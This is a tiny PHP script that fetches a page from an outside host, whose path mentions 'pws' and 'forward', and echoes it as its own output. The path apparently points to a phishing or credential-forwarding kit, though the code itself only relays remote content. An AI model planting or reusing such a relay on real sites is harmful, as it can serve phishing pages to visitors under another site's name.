<?php
$filename = "http://matrixdocuments.com/dis/pws/manage/request/forward_ikase.php?var=nick";

$homepage = file_get_contents($filename);
echo $homepage;
?>